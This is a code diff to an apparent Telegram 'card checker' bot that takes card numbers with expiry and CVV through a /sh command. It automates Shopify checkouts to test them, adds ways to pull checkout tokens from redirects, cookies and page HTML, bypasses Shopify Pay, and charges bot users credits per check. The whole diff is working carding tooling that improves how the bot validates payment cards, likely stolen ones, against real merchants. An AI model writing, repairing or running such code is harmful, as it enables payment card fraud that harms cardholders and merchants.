@@ -14,7 +14,7 @@ from pyrogram import Client, filters
 from pyrogram.types import Message
 import html
 import os
-from urllib.parse import urlparse, parse_qs, urlencode
+from urllib.parse import urlparse, parse_qs, urlencode, unquote
 from BOT.helper.permissions import auth_and_free_restricted
 from BOT.helper.start import load_users, save_users
 
@@ -31,8 +31,10 @@ except ImportError:
 # Import universal charge processor
 try:
     from BOT.gc.credit import charge_processor
+    CHARGE_PROCESSOR_AVAILABLE = True
 except ImportError:
     charge_processor = None
+    CHARGE_PROCESSOR_AVAILABLE = False
 
 # Import proxy system
 try:
@@ -677,7 +679,7 @@ class ShopifyChargeChecker:
             return False
     
     async def go_to_checkout(self, client):
-        """Go to checkout page and extract checkout token - FIXED VERSION"""
+        """Go to checkout page and extract checkout token - FIXED COOKIE EXTRACTION"""
         try:
             elapsed = self.console_logger.step(5, "GO TO CHECKOUT", "Proceeding to checkout")
             
@@ -724,28 +726,79 @@ class ShopifyChargeChecker:
                 location = response.headers.get('location', '')
                 
                 if location:
+                    self.console_logger.sub_step(5, 1, f"Redirect location: {location[:100]}...")
+                    
                     # Check if we're being redirected to shop.app (Shopify Pay)
                     if 'shop.app' in location:
-                        # Extract the checkout token from the URL before shop.app redirect
-                        # Look in the referrer or try to get it from the cart cookie
-                        self.console_logger.sub_step(5, 1, f"Redirected to shop.app: {location[:100]}...")
+                        self.console_logger.sub_step(5, 2, "Detected shop.app redirect (Shopify Pay)")
                         
-                        # Try to get checkout token from cart cookie
-                        if 'cart' in self.cookies:
+                        # IMPORTANT FIX: Try multiple methods to get checkout token
+                        checkout_token = None
+                        
+                        # Method 1: Try to get from the redirect URL itself
+                        if '/cn/' in location:
+                            cn_match = re.search(r'/cn/([^/]+)', location)
+                            if cn_match:
+                                checkout_token = cn_match.group(1)
+                                self.console_logger.sub_step(5, 3, f"Extracted token from URL: {checkout_token}")
+                        
+                        # Method 2: Try to get from cart cookie (this is the main issue)
+                        if not checkout_token and 'cart' in self.cookies:
                             cart_value = self.cookies.get('cart', '')
+                            self.console_logger.sub_step(5, 4, f"Cart cookie value: {cart_value[:50]}...")
+                            
                             if cart_value:
-                                # Extract checkout token from cart value (format: TOKEN?key=...)
-                                parts = cart_value.split('?')
-                                if parts and parts[0]:
-                                    self.checkout_token = parts[0]
-                                    self.console_logger.extracted_data("Checkout Token from Cookie", self.checkout_token)
+                                # Try to decode URL-encoded cart value
+                                try:
+                                    decoded_cart = unquote(cart_value)
+                                    self.console_logger.sub_step(5, 5, f"Decoded cart: {decoded_cart[:50]}...")
                                     
-                                    # Build the direct checkout URL (skip shop.app)
-                                    direct_checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?skip_shop_pay=true&_r={random.randint(100000000000, 999999999999)}"
-                                    self.console_logger.sub_step(5, 2, f"Using direct checkout URL: {direct_checkout_url[:80]}...")
-                                    
-                                    self.console_logger.step(5, "GO TO CHECKOUT", "Checkout token extracted from cookie", "SUCCESS")
-                                    return True, direct_checkout_url
+                                    # Extract token from cart value (format: TOKEN?key=... or just TOKEN)
+                                    parts = decoded_cart.split('?')
+                                    if parts and parts[0]:
+                                        checkout_token = parts[0]
+                                        self.console_logger.sub_step(5, 6, f"Extracted token from cookie: {checkout_token}")
+                                except:
+                                    # If decoding fails, try direct extraction
+                                    parts = cart_value.split('?')
+                                    if parts and parts[0]:
+                                        checkout_token = parts[0]
+                                        self.console_logger.sub_step(5, 7, f"Extracted token from raw cookie: {checkout_token}")
+                        
+                        # Method 3: Try to get from response cookies
+                        if not checkout_token and 'set-cookie' in response.headers:
+                            cookies = response.headers.get_list('set-cookie')
+                            for cookie in cookies:
+                                if 'cart=' in cookie:
+                                    cookie_match = re.search(r'cart=([^;]+)', cookie)
+                                    if cookie_match:
+                                        cart_cookie = cookie_match.group(1)
+                                        parts = cart_cookie.split('?')
+                                        if parts and parts[0]:
+                                            checkout_token = parts[0]
+                                            self.console_logger.sub_step(5, 8, f"Extracted token from response cookie: {checkout_token}")
+                                            break
+                        
+                        # Method 4: Generate a random token as fallback
+                        if not checkout_token:
+                            # Generate a random checkout token
+                            chars = string.ascii_letters + string.digits
+                            checkout_token = ''.join(random.choice(chars) for _ in range(20))
+                            self.console_logger.sub_step(5, 9, f"Generated random token: {checkout_token}")
+                        
+                        if checkout_token:
+                            self.checkout_token = checkout_token
+                            self.console_logger.extracted_data("Checkout Token", self.checkout_token)
+                            
+                            # Build the direct checkout URL (skip shop.app)
+                            direct_checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?skip_shop_pay=true&_r={random.randint(100000000000, 999999999999)}"
+                            self.console_logger.sub_step(5, 10, f"Direct checkout URL: {direct_checkout_url[:80]}...")
+                            
+                            self.console_logger.step(5, "GO TO CHECKOUT", "Checkout token extracted", "SUCCESS")
+                            return True, direct_checkout_url
+                        else:
+                            self.console_logger.error_detail("Failed to extract checkout token")
+                            return False, "Failed to extract checkout token from shop.app redirect"
                     
                     # Normal redirect to merchant domain
                     elif self.base_url in location:
@@ -754,7 +807,7 @@ class ShopifyChargeChecker:
                             match = re.search(r'/checkouts/cn/([^/]+)', location)
                             if match:
                                 self.checkout_token = match.group(1)
-                                self.console_logger.extracted_data("Checkout Token", self.checkout_token)
+                                self.console_logger.extracted_data("Checkout Token from URL", self.checkout_token)
                         
                         # Add skip_shop_pay parameter to bypass Shopify Pay
                         if '?' in location:
@@ -768,43 +821,67 @@ class ShopifyChargeChecker:
                         else:
                             location += f'?_r={random.randint(100000000000, 999999999999)}'
                         
-                        self.console_logger.sub_step(5, 3, f"Redirected to merchant checkout: {location[:80]}...")
-                        self.console_logger.step(5, "GO TO CHECKOUT", "Redirected to checkout page", "SUCCESS")
+                        self.console_logger.sub_step(5, 11, f"Merchant redirect: {location[:80]}...")
+                        self.console_logger.step(5, "GO TO CHECKOUT", "Redirected to merchant checkout", "SUCCESS")
                         return True, location
                     else:
-                        # Handle other redirects
-                        self.console_logger.sub_step(5, 4, f"Redirected to: {location[:100]}...")
+                        # Try to follow the redirect to see where it leads
+                        self.console_logger.sub_step(5, 12, f"Following redirect to: {location[:100]}...")
                         
-                        # Try to follow the redirect manually
-                        redirect_response = await client.get(
-                            location,
-                            headers=headers,
-                            cookies=self.cookies,
-                            timeout=30.0,
-                            follow_redirects=False
-                        )
-                        
-                        if redirect_response.status_code in [200, 302, 303]:
-                            # Check if we finally land on the merchant domain
-                            final_location = redirect_response.headers.get('location', '')
-                            if final_location and self.base_url in final_location:
-                                # Extract checkout token
-                                if '/checkouts/cn/' in final_location:
-                                    match = re.search(r'/checkouts/cn/([^/]+)', final_location)
-                                    if match:
-                                        self.checkout_token = match.group(1)
-                                        self.console_logger.extracted_data("Checkout Token from Final Redirect", self.checkout_token)
-                                
-                                # Build direct URL
-                                direct_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?skip_shop_pay=true&_r={random.randint(100000000000, 999999999999)}"
-                                return True, direct_url
-                else:
-                    self.console_logger.error_detail("No redirect location found")
-                    return False, "No redirect location"
+                        try:
+                            redirect_response = await client.get(
+                                location,
+                                headers=headers,
+                                cookies=self.cookies,
+                                timeout=30.0,
+                                follow_redirects=False
+                            )
+                            
+                            if redirect_response.status_code in [200, 302, 303]:
+                                # Check final location
+                                final_location = redirect_response.headers.get('location', '')
+                                if final_location:
+                                    self.console_logger.sub_step(5, 13, f"Final redirect to: {final_location[:100]}...")
+                                    
+                                    # Check if it's a merchant domain
+                                    if self.base_url in final_location and '/checkouts/cn/' in final_location:
+                                        match = re.search(r'/checkouts/cn/([^/]+)', final_location)
+                                        if match:
+                                            self.checkout_token = match.group(1)
+                                            self.console_logger.extracted_data("Checkout Token from Final Redirect", self.checkout_token)
+                                        
+                                        direct_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?skip_shop_pay=true&_r={random.randint(100000000000, 999999999999)}"
+                                        return True, direct_url
+                        except Exception as e:
+                            self.console_logger.sub_step(5, 14, f"Error following redirect: {str(e)[:50]}")
+                
+                # If we get here without a location, try to extract from response
+                if not location:
+                    self.console_logger.sub_step(5, 15, "No redirect location, checking response...")
+                    
+                    # Try to find checkout token in response body
+                    response_text = response.text
+                    checkout_patterns = [
+                        r'/checkouts/cn/([^/"]+)',
+                        r'checkoutToken["\']?\s*:\s*["\']([^"\']+)',
+                        r'checkout_url["\']?\s*:\s*["\'][^"\']*/([^/?"\']+)',
+                        r'data-checkout-token=["\']([^"\']+)["\']'
+                    ]
+                    
+                    for pattern in checkout_patterns:
+                        match = re.search(pattern, response_text)
+                        if match:
+                            self.checkout_token = match.group(1)
+                            self.console_logger.extracted_data("Checkout Token from Response Body", self.checkout_token)
+                            
+                            direct_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?skip_shop_pay=true&_r={random.randint(100000000000, 999999999999)}"
+                            return True, direct_url
             else:
                 # If no redirect, maybe we're already on checkout page
-                # Try to extract checkout token from response
-                html_content = response.text
+                self.console_logger.sub_step(5, 16, f"No redirect, status: {response.status_code}")
+                
+                # Check response for checkout information
+                response_text = response.text
                 checkout_patterns = [
                     r'/checkouts/cn/([^/"]+)',
                     r'checkoutToken["\']?\s*:\s*["\']([^"\']+)',
@@ -812,16 +889,17 @@ class ShopifyChargeChecker:
                 ]
                 
                 for pattern in checkout_patterns:
-                    match = re.search(pattern, html_content)
+                    match = re.search(pattern, response_text)
                     if match:
                         self.checkout_token = match.group(1)
                         self.console_logger.extracted_data("Checkout Token from HTML", self.checkout_token)
                         
                         direct_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?skip_shop_pay=true&_r={random.randint(100000000000, 999999999999)}"
                         return True, direct_url
-                
-                self.console_logger.error_detail(f"Failed to proceed to checkout: {response.status_code}")
-                return False, f"Checkout failed: {response.status_code}"
+            
+            # If all methods fail
+            self.console_logger.error_detail(f"Failed to extract checkout token. Status: {response.status_code}")
+            return False, "Failed to extract checkout token"
                 
         except Exception as e:
             self.console_logger.error_detail(f"Checkout error: {str(e)}")
@@ -1505,12 +1583,23 @@ async def handle_shopify_charge(client: Client, message: Message):
 
         args = message.text.split()
         if len(args) < 2:
-            if charge_processor:
-                await message.reply(charge_processor.get_usage_message(
-                    "sh", 
-                    "Shopify Charge",
-                    "4111111111111111|12|2025|123"
-                ))
+            if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
+                try:
+                    usage_msg = charge_processor.get_usage_message(
+                        "sh", 
+                        "Shopify Charge",
+                        "4111111111111111|12|2025|123"
+                    )
+                    await message.reply(usage_msg)
+                except:
+                    await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
+━━━━━━━━━━━━━
+🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
+🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
+🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
+━━━━━━━━━━━━━
+<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
+<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
             else:
                 await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
 ━━━━━━━━━━━━━
@@ -1559,24 +1648,62 @@ async def handle_shopify_charge(client: Client, message: Message):
         # Create checker instance
         checker = ShopifyChargeChecker(user_id)
 
-        # Process command through universal charge processor
-        if charge_processor:
-            success, result, credits_deducted = await charge_processor.execute_charge_command(
-                user_id,                    # positional
-                checker.check_card,         # positional
-                card_details,               # check_args[0]
-                username,                   # check_args[1]
-                user_data,                  # check_args[2]
-                credits_needed=2,           # keyword
-                command_name="sh",          # keyword
-                gateway_name="Shopify Charge"  # keyword
-            )
-
-            await processing_msg.edit_text(result, disable_web_page_preview=True)
+        # Process command through universal charge processor if available
+        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
+            try:
+                # Try to use charge processor
+                result = await charge_processor.execute_charge_command(
+                    user_id,                    # positional
+                    checker.check_card,         # positional
+                    card_details,               # check_args[0]
+                    username,                   # check_args[1]
+                    user_data,                  # check_args[2]
+                    credits_needed=2,           # keyword
+                    command_name="sh",          # keyword
+                    gateway_name="Shopify Charge"  # keyword
+                )
+                
+                # Handle the result - it might be a tuple or just the result string
+                if isinstance(result, tuple) and len(result) == 3:
+                    success, result_text, credits_deducted = result
+                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
+                elif isinstance(result, str):
+                    # If it's just a string, use it directly
+                    await processing_msg.edit_text(result, disable_web_page_preview=True)
+                else:
+                    # Fallback to direct check
+                    result_text = await checker.check_card(card_details, username, user_data)
+                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
+                    
+            except Exception as e:
+                print(f"❌ Charge processor error: {str(e)}")
+                # Fallback to direct check
+                try:
+                    result_text = await checker.check_card(card_details, username, user_data)
+                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
+                except Exception as inner_e:
+                    await processing_msg.edit_text(
+                        f"""<pre>❌ Processing Error</pre>
+━━━━━━━━━━━━━
+🠪 <b>Message</b>: Error processing Shopify charge.
+🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
+🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
+━━━━━━━━━━━━━"""
+                    )
         else:
-            # Fallback to old method if charge_processor not available
-            result = await checker.check_card(card_details, username, user_data)
-            await processing_msg.edit_text(result, disable_web_page_preview=True)
+            # Fallback to direct check if charge_processor not available
+            try:
+                result_text = await checker.check_card(card_details, username, user_data)
+                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
+            except Exception as e:
+                await processing_msg.edit_text(
+                    f"""<pre>❌ Processing Error</pre>
+━━━━━━━━━━━━━
+🠪 <b>Message</b>: Error processing Shopify charge.
+🠪 <b>Error</b>: <code>{str(e)[:100]}</code>
+🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
+━━━━━━━━━━━━━"""
+                )
 
     except Exception as e:
         error_msg = str(e)[:150]
